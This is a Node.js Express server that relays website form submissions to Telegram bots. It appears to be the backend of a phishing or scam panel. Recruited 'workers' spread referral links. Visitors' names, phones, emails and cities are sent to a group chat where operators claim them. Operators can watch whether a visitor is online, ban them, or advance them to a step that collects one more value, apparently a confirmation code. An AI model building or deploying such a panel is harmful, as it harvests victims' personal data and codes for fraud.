const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ===== АНТИКРАШ =====
process.on("unhandledRejection", (err) => {
  console.log("❌ UNHANDLED:", err?.message);
});
process.on("uncaughtException", (err) => {
  console.log("❌ CRASH:", err?.message);
});

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТ =====
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});

const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);
const SITE_URL = process.env.SITE_URL; // 🔥 добавь в railway

// ===== SAFE =====
async function safeSend(bot, chatId, text, opts = {}) {
  try { return await bot.sendMessage(chatId, text, opts); }
  catch (e) { console.log("send error:", e?.message); return null; }
}
async function safeEdit(bot, chatId, msgId, text, opts = {}) {
  try {
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: msgId,
      ...opts
    });
  } catch (e) { console.log("edit error:", e?.message); }
}
async function safeDelete(bot, chatId, msgId) {
  try { await bot.deleteMessage(chatId, msgId); }
  catch (e) {}
}

// ===== БАЗЫ =====
let moderators = [];
let usersByUsername = {};
let userRefs = {}; // 🔥 кто привёл

let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let groupMessages = {};
let fullMessages = {};

let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};
let extraSentUsers = {};

// ===== ONLINE =====
function isOnline(id) {
  return onlineUsers[id] && Date.now() - onlineUsers[id] < 20000;
}

// ===== /START =====
workerBot.onText(/\/start/, (msg) => {
  const username = msg.from.username;
  const id = msg.chat.id;

  if (!username) {
    return safeSend(workerBot, id, "❌ Поставь username в Telegram");
  }

  usersByUsername[username.toLowerCase()] = id;

  const link = `${SITE_URL}?ref=${username}`;

  safeSend(workerBot, id,
`✅ Ты зарегистрирован

🔗 Твоя ссылка:
${link}

👥 Делись ей и получай клиентов`
  );
});

// ===== ПРОВЕРКА МОДЕРА =====
function isMod(id) {
  return id === adminId || moderators.includes(id);
}

// ===== МОДЕРЫ =====
workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
  if (msg.chat.id !== adminId) return;

  const username = match[1].toLowerCase();
  const id = usersByUsername[username];

  if (!id) return safeSend(workerBot, adminId, "❌ Он не писал боту");

  if (!moderators.includes(id)) moderators.push(id);

  safeSend(workerBot, adminId, `✅ Добавлен: @${username}`);
});

// ===== ВХОД =====
app.post("/enter", async (req, res) => {
  const { clientId, ref } = req.body;

  if (!clientId) return res.json({ ok: false });

  onlineUsers[clientId] = Date.now();

  if (ref) userRefs[clientId] = ref;

  await safeSend(enterBot, adminId, `👀 Вход\n🆔 ${clientId}`);

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ЗАЯВКА =====
app.post("/send", async (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  delete takenRequests[id];
  delete extraSentUsers[id];

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ" : "🆕 НОВАЯ";

  const refUser = userRefs[id]
    ? `👤 Привёл: @${userRefs[id]}`
    : "👤 Привёл: неизвестно";

  const fullText = `${statusText}

🆔 ${id}
📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📅 ${d.email}
${d.city}
${d.comment}

${refUser}`;

  const shortText = `${statusText}

📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}

${refUser}`;

  fullRequests[id] = fullText;
  shortRequests[id] = shortText;

  const msg = await safeSend(workerBot, workerChat, shortText, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  });

  if (msg) groupMessages[id] = msg.message_id;

  userStatus[id] = "wait";

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП =====
app.post("/send2", async (req, res) => {
  const { id, value } = req.body;

  if (!id || !value) return res.json({ ok: false });

  if (extraSentUsers[id]) return res.json({ ok: false });

  extraSentUsers[id] = true;

  const owner = takenRequests[id];

  if (owner) {
    await safeSend(workerBot, owner, `📩 ДОП\n🆔 ${id}\n💬 ${value}`);
  }

  res.json({ ok: true });
});

// ===== CALLBACK =====
workerBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (!isMod(q.from.id)) {
    return workerBot.answerCallbackQuery(q.id, { text: "❌ Нет доступа" });
  }

  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return workerBot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
    }

    takenRequests[id] = q.from.id;

    const username = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    const sent = await safeSend(workerBot, q.from.id, fullRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
        ]
      }
    });

    if (sent) fullMessages[id] = sent.message_id;

    await safeEdit(workerBot, workerChat, groupMessages[id],
`${shortRequests[id]}

👤 Взял: ${username}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔓 Освободить", callback_data: "free_" + id }]
        ]
      }
    });

    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("free")) {
    delete takenRequests[id];

    await safeDelete(workerBot, q.from.id, fullMessages[id]);

    await safeEdit(workerBot, workerChat, groupMessages[id],
      shortRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📥 Забрать", callback_data: "take_" + id }]
        ]
      }
    });

    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    workerBot.answerCallbackQuery(q.id);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
